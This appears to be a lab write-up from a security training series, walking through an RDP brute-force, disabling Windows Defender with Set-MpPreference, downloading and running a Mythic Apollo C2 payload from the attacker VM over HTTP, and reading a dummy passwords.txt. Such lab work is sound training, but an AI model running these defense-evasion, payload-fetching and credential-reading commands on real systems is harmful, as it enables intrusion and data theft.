# 🧠 Mythic Agent Setup Tutorial | Day 21

## 🎯 Objective
Learn how to perform an **RDP brute-force attack**, generate and deploy a **Mythic agent**, and establish a successful **Command and Control (C2)** connection.



## 🧪 Lab Environment
- **Attacker Machine**: Parrot OS VM
- **Target Machine**: Windows Server VM
- **C2 Framework**: Mythic C2
- **Agent Used**: Apollo
- **C2 Profile**: HTTP



## 🛠️ Steps Performed

### 1. Brute-Force via RDP
- Used my Parrot OS VM to brute-force RDP credentials of the Windows Server VM.
- Successfully gained access.

### 2. Post-Exploitation Discovery
On the compromised Windows Server:
```powershell
whoami
ipconfig
net user
net user Administrator
````

### 3. Defense Evasion

* Disabled Windows Defender to avoid detection of our payload:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 4. Payload Generation via Mythic

* Installed the **Apollo** agent in Mythic.
* Selected the **HTTP** C2 profile.
* Built a payload specifically for the Windows Server target.

### 5. Payload Delivery

* Started a Python HTTP server on Mythic VM:

```bash
python3 -m http.server 80
```

* On the Windows VM, downloaded the payload using PowerShell:

```powershell
Invoke-WebRequest -Uri http://<mythic-vm-ip>/payload.exe -OutFile C:\Users\Public\payload.exe
```

### 6. Agent Execution

* Executed the payload and successfully established a session in Mythic:

```powershell
Start-Process "C:\Users\Public\payload.exe"
```

### 7. Remote Execution for Data Exfiltration

* Remotely executed commands to simulate data exfiltration:

```powershell
Get-Content C:\Users\Public\passwords.txt
```

> Note: `passwords.txt` was a dummy file created for demo purposes.



## 🔐 Key Learnings

* Hands-on C2 setup and management with Mythic
* RDP brute-force simulation
* Payload generation and delivery
* Remote command execution and data exfiltration
* Defense evasion techniques

⚠️ This tutorial was conducted in a **controlled lab environment** for educational purposes only.
Performing unauthorized access or attacks on real systems is **illegal** and against ethical hacking principles.
